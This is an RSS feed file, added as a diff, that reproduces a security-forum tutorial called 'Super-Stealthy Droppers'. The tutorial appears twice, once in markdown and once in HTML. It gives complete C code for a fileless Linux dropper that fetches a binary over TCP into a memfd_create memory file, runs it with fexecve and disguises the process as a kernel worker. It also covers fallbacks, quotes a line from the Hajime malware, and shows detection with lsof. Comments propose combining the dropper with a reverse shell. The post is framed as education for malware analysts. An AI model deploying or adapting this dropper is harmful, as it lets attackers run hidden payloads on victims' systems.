@@ -1,0 +1,475 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Super-Stealthy Droppers</title>
+    <link>https://d.clarkee.co.uk/t/super-stealthy-droppers/3715</link>
+    <description>Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using `ptrace`. The article is very interesting and I recommend you to read it, but what caught my attention was a brief sentence towards the end. Actually this one:
+
+&gt; The current payload in use is a simple `open/memfd_create/sendfile/fexecve` program
+
+I&#39;ve never heard before about `memfd_create` or `fexecve`... that&#39;s why this sentence caught my attention.
+
+In this paper we are going to talk about how to use these functions to develop a super-stealthy dropper. You could consider it as a malware development tutorial... but you know that it is illegal to develop and also to deploy malware. This means that, this paper is only for educational purposes... because, after all, a malware analyst needs to know how malware developers do their stuff in order to identify it, neutralise it and do what is needed to keep systems safe. 
+
+# `memfd_create` and `fexecve`
+So, after reading that intriguing sentence, I googled those two functions and I saw they were pretty cool. The first one is actually pretty awesome, it allows us to create a file in memory. We have quickly talked about this in [a previous paper] (https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166), but for that we were just using `/dev/shm` to store our file. That folder is actually stored in memory so, whatever we write there does not end up in the hard-drive (unless we run out of memory and we start swapping). However, the file was visible with a simple `ls`.
+
+`memfd_create` does the same, but the _memory disk_ it uses is not mapped into the file system and therefore you cannot find the file with a simple `ls`. :o
+
+The second one, `fexecve` is also pretty awesome. It allows us to execute a program (exactly the same way that `execve`), but we reference the program to run using a file descriptor, instead of the full path. And this one matches perfectly with `memfd_create`.
+
+But there is a caveat with this function calls. They are relatively new. `memfd_create` was introduced in kernel 3.17 and `fexecve` is a `libc` function available since version 2.3.2. While, `fexecve` can be easily implemented when not available (we will see that in a sec), `memfd_create` is just not there on old kernels...
+
+What does this means?. It means that, at least nowadays, the technique we are going to describe will not work on embedded devices that usually run old kernels and have stripped-down versions of libc. Although, I haven&#39;t checked the availability of `fexecve` in for instance some routers or Android phones, I believe it is very likely that they are not available. If anybody knows, please drop a line in the comments.
+
+# A simple dropper
+In order to figure out how these two little guys work, I wrote a simple dropper. Well, it is actually a program able to download some binary from a remote server and run it directly into memory, without dropping it in the disk.
+
+Before continuing, let&#39;s check the Hajime case we described [towards the end of this post] (https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966). There you will find a cryptic shell line that basically creates a file with execution permissions to drop into it another file which is downloaded from the net. Then the downloaded program gets executed and deleted from the disk. In case you don&#39;t want to open the link again, this is the line I&#39;m talking about:
+
+```
+cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI
+```
+
+We are going to write a version of `.s` that, once executed, will do exactly the same that the cryptic shell line above.
+
+Let&#39;s first take a look to the code and then we can comment it.
+
+# The code
+This is the code:
+
+```
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#include &lt;sys/syscall.h&gt;
+
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+#define __NR_memfd_create 319
+#define MFD_CLOEXEC 1
+
+static inline int memfd_create(const char *name, unsigned int flags) {
+    return syscall(__NR_memfd_create, name, flags);
+}
+
+extern char        **environ;
+
+int main (int argc, char **argv) {
+  int                fd, s;
+  unsigned long      addr = 0x0100007f11110002;
+  char               *args[2]= {&quot;[kworker/u!0]&quot;, NULL};
+  char               buf[1024];
+
+  // Connect
+  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);
+  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);
+  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);
+
+  while (1) {
+      if ((read (s, buf, 1024) ) &lt;= 0) break;
+      write (fd, buf, 1024);
+    }
+  close (s);
+  
+  if (fexecve (fd, args, environ) &lt; 0) exit (1);
+
+  return 0;
+    
+}
+```
+It is pretty short and simple, isn&#39;t it?. But there are a couple of things we have to say about it.
+
+## Calling `memfd_create`
+The first thing we have to comment is that, there is no `libc` wrapper to the `memfd_create` system call. You would find this information in the [`memfd_create` manpage&#39;s NOTES section](http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES). That means that we have to write our own wrapper.
+
+First, we need to figure out the syscall index for `memfd_create`. Just use any on-line syscall list. Remember that the indexes changes with the architecture, so if you plan to use the code on an ARM or a MIPS, you may need to use a different index. The index we used `319` is for `x86_64`.
+
+You can see the wrapper at the very beginning of the code (just after the `#include` directives), using the `syscall` libc function.
+
+Then, the program just does the following:
+
+* Create a normal TCP socket
+* Connect to port 0x1111 on 127.0.0.1 using family `AF_INET`... We have packed all this information in a `long` variable to make the code shorter... but you can easily modify this information taking into account that:
+```
+    addr = 01 00 00  7f   1111  0002;
+            1. 0. 0.127   1111  0002;
+           +------------+------+----
+             IP Address | Port | Family
+```
+
+Of course this is not standard and whenever the `struct sockaddr_in` change, the code will break down... but it was cool to write it like this :P
+
+* Creates a memory file
+* Reads data from the socket and writes it into the memory file
+* Runs the memory file once all the data has been transferred.
+
+That&#39;s it... very simple and straightforward.
+
+# Testing
+So, now it is time to test it. According to our long constant in the `main` function, the `dropper` will connect to port `0x1111` on localhost (`127.0.0.1`). So we will improvise a file server with `netcat`.
+
+In one console we just run this command:
+
+```
+$ cat /usr/bin/xeyes | nc -l $((0x1111))
+```
+
+_You can chose whatever binary you prefer. I like those little eyes following my mouse pointer all over the place_
+
+Then in another console we run the dropper, and those funny `xeyes` should pop-up in your screen. Let&#39;s see which tracks we can find after running the remote code.
+
+# Detecting the dropper
+Spotting the process is difficult because we have given it a funny name (`kworker/u!0`). Note the `!` character that is just there to allow me to quickly identify the process for debugging purposes. In reality, you would like to use a `:` so the process looks like one of those kernel workers. But, let&#39;s look at the `ps` output.
+
+    $ ps axe
+    (...)
+     2126 ?        S      0:00 [kworker/0:0]
+     2214 pts/0    S+     0:00 [kworker/u!0]
+    (...)
+
+You can see the output for a legit `kworker` process in the first line, and then you find our doggy program in the second line... which is associated to a pseudo-terminal!!!... I think this can be easily avoided... but I will leave this to you to sharp your UNIX development skills ;)
+
+However, even if you detach the process from the pseudo-terminal.... 
+
+# Invisible file
+We mentioned that `memfd_create` will create a file in a RAM filesystem that is not mapped into the normal filesystem tree... at least, if it is mapped, I couldn&#39;t find where. So far this looks like a pretty stealth way to drop a file!!
+
+However, let&#39;s face it, if there is a file somewhere, there should be a way to find it.... shouldn&#39;t it? Of course it is. But, when you are in this kind of troubles.... who you gonna call?... Sure... Ghostbusters!. And you know what?, for GNU/Linux systems the way to bust ghosts is using `lsof` :).
+
+
+    $ lsof | grep memfd
+    3         2214            pico  txt       REG                0,5    19928      28860 /memfd:a (deleted)
+
+So, we can easily find any `memfd` file in the system using `lsof`. Note that `lsof` will also indicate the associated PID so we can also easily pin point the dropped process even when it is using some name camouflage and it is not associated to a pseudo-terminal!!!
+
+# What if `memfd_open` is not available?
+We have mentioned that `memfd_open` is only available on kernels 3.17 or higher. What can be done for other kernels?. In this case we will be a bit less stealthy but we can still do pretty well.
+
+Our best option in this case is to use `shm_open` (SHared Memory Open). This function basically creates a file under `/dev/shm`... however, this one will be visible with `ls`, but at least we avoid writing to the disk. The only difference between using `shm_open` or just `open` is that `shm_open` will create the files directly under `/dev/shm`. While, when using `open` we have to provide the whole path.
+
+To modify the dropper to use `shm_open` we have to do two things.
+
+First we have to substitute the `memfd_create` call by a `shm_open` call like this:
+
+```
+(...)
+if ((fd = shm_open(&quot;a&quot;, O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);
+(...)
+```
+
+The second thing is that we need to close the file and re-open it read-only in order to be able to execute it with `fexecve`. So, after the while loop that populates the file we have to close and re-open the file:
+
+```
+(...)
+  close (fd);
+
+  if ((fd = shm_open(&quot;a&quot;, O_RDONLY, 0)) &lt; 0) exit (1);
+(...)
+```
+
+However note that, now it does not make much sense to use `fexecve` and we can avoid reopening the file read-only and just call `execve` on the file created at `/dev/shm/` which is effectively the same and it is also shorter.
+
+# ... and what if `fexecve` is not available?
+This one is pretty easy, whenever you get to know how `fexecve` works. How can you figure out how the function works?... just google for its source code!!!. A hint is provided in the man page tho:
+
+&gt; NOTES
+&gt;        On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.
+
+So, what it does is to just use `execve` but providing as file path the file descriptor entry under `/proc`. Let&#39;s elaborate this a bit more. You know that each open file is identified by an integer and you also know that each process in your GNU/Linux system exports all its related information under the `proc` pseudo file system in a folder named against its PID (supposing the `proc` file system is mounted). Well, inside that folder you will find another folder named `fd` containing a file per each file descriptor opened by the process. Each file is named against its actual file descriptor, that is, the integer number.
+
+Knowing all this, we can run a file identified by a file descriptor just passing the path to the right file under `/proc/PID/fd/THE_FD` to `execve`. A basic implementation of `fexecve` will look like this:
+
+```
+int
+my_fexecve (int fd, char **arg, char **env) {
+  char  fname[1024];
+
+  snprintf (fname, 1024, &quot;/proc/%d/fd/%d&quot;, getpid(), fd);
+  execve (fname, arg, env);
+  return 0;
+}
+```
+
+This implementation of `fexecve` is completely equivalent to the standard one... well it is missing some sanity checks but, after all, we&#39;re living in the edge :P.
+
+As mentioned before, this is very convenient to be used together with `memfd_open` that returns to us a file descriptor and does not require the `close/open` sequence. Otherwise, when there is a file somewhere, even in memory, it is even faster to just use `execve` as you can infer from the implementation above.
+
+# Conclusions
+Well, this is it. Hope you have found this interesting. It was interesting for me. Now, after having read this paper, you should be able to figure out what the _open/memfd_create/sendfile/fexecve_ we mentioned at the beginning means...
+
+We have also seen a quite stealthy technique to drop files in a remote system. And we have also learn how to detect the dropper even when it may look invisible at first glance.
+
+You can download all the code from:
+
+https://github.com/0x00pf/0x00sec_code/tree/master/sdropper</description>
+    
+    <lastBuildDate>Sun, 09 Sep 2018 09:06:20 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Super-Stealthy Droppers</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 14 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/10</link>
+        <pubDate>Sun, 23 Sep 2018 17:00:02 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3715-10</guid>
+        <source url="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715.rss">Super-Stealthy Droppers</source>
+      </item>
+      <item>
+        <title>Super-Stealthy Droppers</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/9</link>
+        <pubDate>Sun, 09 Sep 2018 09:06:20 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3715-9</guid>
+        <source url="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715.rss">Super-Stealthy Droppers</source>
+      </item>
+      <item>
+        <title>Super-Stealthy Droppers</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>I’m going to necrobump this article, apologies if you’ve read this one before.</p>
+<p>It would be really cool if we could mix this dropper with this shell, <a href="https://github.com/audibleblink/gorsh">https://github.com/audibleblink/gorsh</a>. Anybody up for the challenge?</p>
+<p>EDIT: Ok, so I’ve figured out how to incorporate them together. Expect an article on this…</p>
+          <p><a href="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/8</link>
+        <pubDate>Sun, 09 Sep 2018 09:06:14 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3715-8</guid>
+        <source url="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715.rss">Super-Stealthy Droppers</source>
+      </item>
+      <item>
+        <title>Super-Stealthy Droppers</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/7</link>
+        <pubDate>Tue, 23 Jan 2018 12:00:11 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3715-7</guid>
+        <source url="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715.rss">Super-Stealthy Droppers</source>
+      </item>
+      <item>
+        <title>Super-Stealthy Droppers</title>
+        <dc:creator><![CDATA[Botnet-a]]></dc:creator>
+        <description><![CDATA[
+            <p>This is very interesting in fact, keep up the good work.</p>
+          <p><a href="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/6</link>
+        <pubDate>Tue, 23 Jan 2018 11:36:25 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3715-6</guid>
+        <source url="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715.rss">Super-Stealthy Droppers</source>
+      </item>
+      <item>
+        <title>Super-Stealthy Droppers</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>OH NO! HE’S DONE IT AGAIN.</p>
+<p>This is actually pretty cool, this is essentially reflective loading on Linux? I attempted this a while back through <code>echo "C code" | gcc -O - | somemagic</code>, and it failed.</p>
+<p>I can think of some serious legitimate uses for this, such as a rapidly updating piece of software, that updates on each run automatically.</p>
+<p>Now is it possible for us to take this up a notch, and use this with stego? Get an image, extract stego + base64, decode base64, run binary silently. That would be another level…</p>
+<p>Anyway - good job on this article pico <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> Well written as always!</p>
+          <p><a href="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/2</link>
+        <pubDate>Mon, 25 Sep 2017 16:45:46 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3715-2</guid>
+        <source url="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715.rss">Super-Stealthy Droppers</source>
+      </item>
+      <item>
+        <title>Super-Stealthy Droppers</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>Some weeks ago I found [this interesting article] (<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" rel="noopener nofollow ugc">https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html</a>), about injecting code in running processes without using <code>ptrace</code>. The article is very interesting and I recommend you to read it, but what caught my attention was a brief sentence towards the end. Actually this one:</p>
+<blockquote>
+<p>The current payload in use is a simple <code>open/memfd_create/sendfile/fexecve</code> program</p>
+</blockquote>
+<p>I’ve never heard before about <code>memfd_create</code> or <code>fexecve</code>… that’s why this sentence caught my attention.</p>
+<p>In this paper we are going to talk about how to use these functions to develop a super-stealthy dropper. You could consider it as a malware development tutorial… but you know that it is illegal to develop and also to deploy malware. This means that, this paper is only for educational purposes… because, after all, a malware analyst needs to know how malware developers do their stuff in order to identify it, neutralise it and do what is needed to keep systems safe.</p>
+<h1><a name="p-15968-memfd_create-and-fexecve-1" class="anchor" href="https://d.clarkee.co.uk#p-15968-memfd_create-and-fexecve-1"></a><code>memfd_create</code> and <code>fexecve</code></h1>
+<p>So, after reading that intriguing sentence, I googled those two functions and I saw they were pretty cool. The first one is actually pretty awesome, it allows us to create a file in memory. We have quickly talked about this in [a previous paper] (<a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" rel="noopener nofollow ugc">https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166</a>), but for that we were just using <code>/dev/shm</code> to store our file. That folder is actually stored in memory so, whatever we write there does not end up in the hard-drive (unless we run out of memory and we start swapping). However, the file was visible with a simple <code>ls</code>.</p>
+<p><code>memfd_create</code> does the same, but the <em>memory disk</em> it uses is not mapped into the file system and therefore you cannot find the file with a simple <code>ls</code>. :o</p>
+<p>The second one, <code>fexecve</code> is also pretty awesome. It allows us to execute a program (exactly the same way that <code>execve</code>), but we reference the program to run using a file descriptor, instead of the full path. And this one matches perfectly with <code>memfd_create</code>.</p>
+<p>But there is a caveat with this function calls. They are relatively new. <code>memfd_create</code> was introduced in kernel 3.17 and <code>fexecve</code> is a <code>libc</code> function available since version 2.3.2. While, <code>fexecve</code> can be easily implemented when not available (we will see that in a sec), <code>memfd_create</code> is just not there on old kernels…</p>
+<p>What does this means?. It means that, at least nowadays, the technique we are going to describe will not work on embedded devices that usually run old kernels and have stripped-down versions of libc. Although, I haven’t checked the availability of <code>fexecve</code> in for instance some routers or Android phones, I believe it is very likely that they are not available. If anybody knows, please drop a line in the comments.</p>
+<h1><a name="p-15968-a-simple-dropper-2" class="anchor" href="https://d.clarkee.co.uk#p-15968-a-simple-dropper-2"></a>A simple dropper</h1>
+<p>In order to figure out how these two little guys work, I wrote a simple dropper. Well, it is actually a program able to download some binary from a remote server and run it directly into memory, without dropping it in the disk.</p>
+<p>Before continuing, let’s check the Hajime case we described [towards the end of this post] (<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" rel="noopener nofollow ugc">https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966</a>). There you will find a cryptic shell line that basically creates a file with execution permissions to drop into it another file which is downloaded from the net. Then the downloaded program gets executed and deleted from the disk. In case you don’t want to open the link again, this is the line I’m talking about:</p>
+<pre><code class="lang-auto">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI
+</code></pre>
+<p>We are going to write a version of <code>.s</code> that, once executed, will do exactly the same that the cryptic shell line above.</p>
+<p>Let’s first take a look to the code and then we can comment it.</p>
+<h1><a name="p-15968-the-code-3" class="anchor" href="https://d.clarkee.co.uk#p-15968-the-code-3"></a>The code</h1>
+<p>This is the code:</p>
+<pre><code class="lang-auto">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#include &lt;sys/syscall.h&gt;
+
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+#define __NR_memfd_create 319
+#define MFD_CLOEXEC 1
+
+static inline int memfd_create(const char *name, unsigned int flags) {
+    return syscall(__NR_memfd_create, name, flags);
+}
+
+extern char        **environ;
+
+int main (int argc, char **argv) {
+  int                fd, s;
+  unsigned long      addr = 0x0100007f11110002;
+  char               *args[2]= {"[kworker/u!0]", NULL};
+  char               buf[1024];
+
+  // Connect
+  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);
+  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);
+  if ((fd = memfd_create("a", MFD_CLOEXEC)) &lt; 0) exit (1);
+
+  while (1) {
+      if ((read (s, buf, 1024) ) &lt;= 0) break;
+      write (fd, buf, 1024);
+    }
+  close (s);
+  
+  if (fexecve (fd, args, environ) &lt; 0) exit (1);
+
+  return 0;
+    
+}
+</code></pre>
+<p>It is pretty short and simple, isn’t it?. But there are a couple of things we have to say about it.</p>
+<h2><a name="p-15968-calling-memfd_create-4" class="anchor" href="https://d.clarkee.co.uk#p-15968-calling-memfd_create-4"></a>Calling <code>memfd_create</code></h2>
+<p>The first thing we have to comment is that, there is no <code>libc</code> wrapper to the <code>memfd_create</code> system call. You would find this information in the <a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" rel="noopener nofollow ugc"><code>memfd_create</code> manpage’s NOTES section</a>. That means that we have to write our own wrapper.</p>
+<p>First, we need to figure out the syscall index for <code>memfd_create</code>. Just use any on-line syscall list. Remember that the indexes changes with the architecture, so if you plan to use the code on an ARM or a MIPS, you may need to use a different index. The index we used <code>319</code> is for <code>x86_64</code>.</p>
+<p>You can see the wrapper at the very beginning of the code (just after the <code>#include</code> directives), using the <code>syscall</code> libc function.</p>
+<p>Then, the program just does the following:</p>
+<ul>
+<li>Create a normal TCP socket</li>
+<li>Connect to port 0x1111 on 127.0.0.1 using family <code>AF_INET</code>… We have packed all this information in a <code>long</code> variable to make the code shorter… but you can easily modify this information taking into account that:</li>
+</ul>
+<pre><code class="lang-auto">    addr = 01 00 00  7f   1111  0002;
+            1. 0. 0.127   1111  0002;
+           +------------+------+----
+             IP Address | Port | Family
+</code></pre>
+<p>Of course this is not standard and whenever the <code>struct sockaddr_in</code> change, the code will break down… but it was cool to write it like this <img src="https://d.clarkee.co.uk/images/emoji/twitter/stuck_out_tongue.png?v=15" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:" loading="lazy" width="20" height="20"></p>
+<ul>
+<li>Creates a memory file</li>
+<li>Reads data from the socket and writes it into the memory file</li>
+<li>Runs the memory file once all the data has been transferred.</li>
+</ul>
+<p>That’s it… very simple and straightforward.</p>
+<h1><a name="p-15968-testing-5" class="anchor" href="https://d.clarkee.co.uk#p-15968-testing-5"></a>Testing</h1>
+<p>So, now it is time to test it. According to our long constant in the <code>main</code> function, the <code>dropper</code> will connect to port <code>0x1111</code> on localhost (<code>127.0.0.1</code>). So we will improvise a file server with <code>netcat</code>.</p>
+<p>In one console we just run this command:</p>
+<pre><code class="lang-auto">$ cat /usr/bin/xeyes | nc -l $((0x1111))
+</code></pre>
+<p><em>You can chose whatever binary you prefer. I like those little eyes following my mouse pointer all over the place</em></p>
+<p>Then in another console we run the dropper, and those funny <code>xeyes</code> should pop-up in your screen. Let’s see which tracks we can find after running the remote code.</p>
+<h1><a name="p-15968-detecting-the-dropper-6" class="anchor" href="https://d.clarkee.co.uk#p-15968-detecting-the-dropper-6"></a>Detecting the dropper</h1>
+<p>Spotting the process is difficult because we have given it a funny name (<code>kworker/u!0</code>). Note the <code>!</code> character that is just there to allow me to quickly identify the process for debugging purposes. In reality, you would like to use a <code>:</code> so the process looks like one of those kernel workers. But, let’s look at the <code>ps</code> output.</p>
+<pre><code>$ ps axe
+(...)
+ 2126 ?        S      0:00 [kworker/0:0]
+ 2214 pts/0    S+     0:00 [kworker/u!0]
+(...)
+</code></pre>
+<p>You can see the output for a legit <code>kworker</code> process in the first line, and then you find our doggy program in the second line… which is associated to a pseudo-terminal!!!.. I think this can be easily avoided… but I will leave this to you to sharp your UNIX development skills <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
+<p>However, even if you detach the process from the pseudo-terminal…</p>
+<h1><a name="p-15968-invisible-file-7" class="anchor" href="https://d.clarkee.co.uk#p-15968-invisible-file-7"></a>Invisible file</h1>
+<p>We mentioned that <code>memfd_create</code> will create a file in a RAM filesystem that is not mapped into the normal filesystem tree… at least, if it is mapped, I couldn’t find where. So far this looks like a pretty stealth way to drop a file!!</p>
+<p>However, let’s face it, if there is a file somewhere, there should be a way to find it… shouldn’t it? Of course it is. But, when you are in this kind of troubles… who you gonna call?.. Sure… Ghostbusters!. And you know what?, for GNU/Linux systems the way to bust ghosts is using <code>lsof</code> :).</p>
+<pre><code>$ lsof | grep memfd
+3         2214            pico  txt       REG                0,5    19928      28860 /memfd:a (deleted)
+</code></pre>
+<p>So, we can easily find any <code>memfd</code> file in the system using <code>lsof</code>. Note that <code>lsof</code> will also indicate the associated PID so we can also easily pin point the dropped process even when it is using some name camouflage and it is not associated to a pseudo-terminal!!!</p>
+<h1><a name="p-15968-what-if-memfd_open-is-not-available-8" class="anchor" href="https://d.clarkee.co.uk#p-15968-what-if-memfd_open-is-not-available-8"></a>What if <code>memfd_open</code> is not available?</h1>
+<p>We have mentioned that <code>memfd_open</code> is only available on kernels 3.17 or higher. What can be done for other kernels?. In this case we will be a bit less stealthy but we can still do pretty well.</p>
+<p>Our best option in this case is to use <code>shm_open</code> (SHared Memory Open). This function basically creates a file under <code>/dev/shm</code>… however, this one will be visible with <code>ls</code>, but at least we avoid writing to the disk. The only difference between using <code>shm_open</code> or just <code>open</code> is that <code>shm_open</code> will create the files directly under <code>/dev/shm</code>. While, when using <code>open</code> we have to provide the whole path.</p>
+<p>To modify the dropper to use <code>shm_open</code> we have to do two things.</p>
+<p>First we have to substitute the <code>memfd_create</code> call by a <code>shm_open</code> call like this:</p>
+<pre><code class="lang-auto">(...)
+if ((fd = shm_open("a", O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);
+(...)
+</code></pre>
+<p>The second thing is that we need to close the file and re-open it read-only in order to be able to execute it with <code>fexecve</code>. So, after the while loop that populates the file we have to close and re-open the file:</p>
+<pre><code class="lang-auto">(...)
+  close (fd);
+
+  if ((fd = shm_open("a", O_RDONLY, 0)) &lt; 0) exit (1);
+(...)
+</code></pre>
+<p>However note that, now it does not make much sense to use <code>fexecve</code> and we can avoid reopening the file read-only and just call <code>execve</code> on the file created at <code>/dev/shm/</code> which is effectively the same and it is also shorter.</p>
+<h1><a name="p-15968-and-what-if-fexecve-is-not-available-9" class="anchor" href="https://d.clarkee.co.uk#p-15968-and-what-if-fexecve-is-not-available-9"></a>… and what if <code>fexecve</code> is not available?</h1>
+<p>This one is pretty easy, whenever you get to know how <code>fexecve</code> works. How can you figure out how the function works?.. just google for its source code!!!. A hint is provided in the man page tho:</p>
+<blockquote>
+<p>NOTES<br>
+On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.</p>
+</blockquote>
+<p>So, what it does is to just use <code>execve</code> but providing as file path the file descriptor entry under <code>/proc</code>. Let’s elaborate this a bit more. You know that each open file is identified by an integer and you also know that each process in your GNU/Linux system exports all its related information under the <code>proc</code> pseudo file system in a folder named against its PID (supposing the <code>proc</code> file system is mounted). Well, inside that folder you will find another folder named <code>fd</code> containing a file per each file descriptor opened by the process. Each file is named against its actual file descriptor, that is, the integer number.</p>
+<p>Knowing all this, we can run a file identified by a file descriptor just passing the path to the right file under <code>/proc/PID/fd/THE_FD</code> to <code>execve</code>. A basic implementation of <code>fexecve</code> will look like this:</p>
+<pre><code class="lang-auto">int
+my_fexecve (int fd, char **arg, char **env) {
+  char  fname[1024];
+
+  snprintf (fname, 1024, "/proc/%d/fd/%d", getpid(), fd);
+  execve (fname, arg, env);
+  return 0;
+}
+</code></pre>
+<p>This implementation of <code>fexecve</code> is completely equivalent to the standard one… well it is missing some sanity checks but, after all, we’re living in the edge :P.</p>
+<p>As mentioned before, this is very convenient to be used together with <code>memfd_open</code> that returns to us a file descriptor and does not require the <code>close/open</code> sequence. Otherwise, when there is a file somewhere, even in memory, it is even faster to just use <code>execve</code> as you can infer from the implementation above.</p>
+<h1><a name="p-15968-conclusions-10" class="anchor" href="https://d.clarkee.co.uk#p-15968-conclusions-10"></a>Conclusions</h1>
+<p>Well, this is it. Hope you have found this interesting. It was interesting for me. Now, after having read this paper, you should be able to figure out what the <em>open/memfd_create/sendfile/fexecve</em> we mentioned at the beginning means…</p>
+<p>We have also seen a quite stealthy technique to drop files in a remote system. And we have also learn how to detect the dropper even when it may look invisible at first glance.</p>
+<p>You can download all the code from:</p>
+<aside class="onebox githubfolder" data-onebox-src="https://github.com/0x00pf/0x00sec_code/tree/master/sdropper">
+  <header class="source">
+      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" alt="" width="32" height="32">
+
+      <a href="https://github.com/0x00pf/0x00sec_code/tree/master/sdropper" target="_blank" rel="noopener nofollow ugc">github.com</a>
+  </header>
+
+  <article class="onebox-body">
+    <h3><a href="https://github.com/0x00pf/0x00sec_code/tree/master/sdropper" target="_blank" rel="noopener nofollow ugc">0x00sec_code/sdropper at master · 0x00pf/0x00sec_code</a></h3>
+
+
+  <p><span class="label1">Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.</span></p>
+
+  </article>
+
+  <div class="onebox-metadata">
+    
+    
+  </div>
+
+  <div style="clear: both"></div>
+</aside>
+
+          <p><a href="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/super-stealthy-droppers/3715/1</link>
+        <pubDate>Mon, 25 Sep 2017 16:38:34 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3715-1</guid>
+        <source url="https://d.clarkee.co.uk/t/super-stealthy-droppers/3715.rss">Super-Stealthy Droppers</source>
+      </item>
+  </channel>
+</rss>
